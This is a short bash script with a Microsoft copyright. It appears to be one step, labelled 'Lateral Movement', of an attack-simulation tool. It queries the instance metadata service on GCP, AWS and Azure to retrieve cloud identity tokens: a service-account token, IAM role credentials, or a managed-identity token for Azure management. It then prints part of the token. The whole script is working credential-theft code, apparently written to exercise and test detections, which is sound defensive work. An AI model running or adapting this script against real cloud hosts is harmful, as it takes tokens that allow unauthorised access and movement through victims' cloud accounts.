#!/bin/bash

# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

echo "--- Lateral Movement ---"
echo "Sending request to IMDS to retrieve cloud identity token"
if token=$(curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"| grep -Po '"access_token":"\K.*?(?=")'); then
    cloud="GCP"
elif awstoken=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); then
    cloud="AWS"
    roles=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials" -H "X-aws-ec2-metadata-token: $awstoken")
    for role in $roles; do
        token=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -H "X-aws-ec2-metadata-token: $awstoken" | grep -Po '"Token" : "\K.*?(?=")')
    done
else
    cloud="Azure"
    subId=$(curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2017-08-01&format=text")
    rg=$(curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2017-08-01&format=text")
    location=$(curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/location?api-version=2017-08-01&format=text")
    cluster=$(echo $rg | grep -Po "[^_]+(?=_$location)")
    identity="/subscriptions/$subId/resourcegroups/$rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/$cluster-agentpool"
    imds_addr="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"
    imds_res=$(curl -sf -H Metadata:true "$imds_addr" ||curl -sf -H Metadata:true "$imds_addr&msi_res_id=$identity")
    token=$(echo $imds_res | grep -Po '"Access_token":"\K.*?(?=")')
fi
test $token && echo "$cloud token: $token" | head -c 30 && echo "..." || echo "No token found"
echo " "
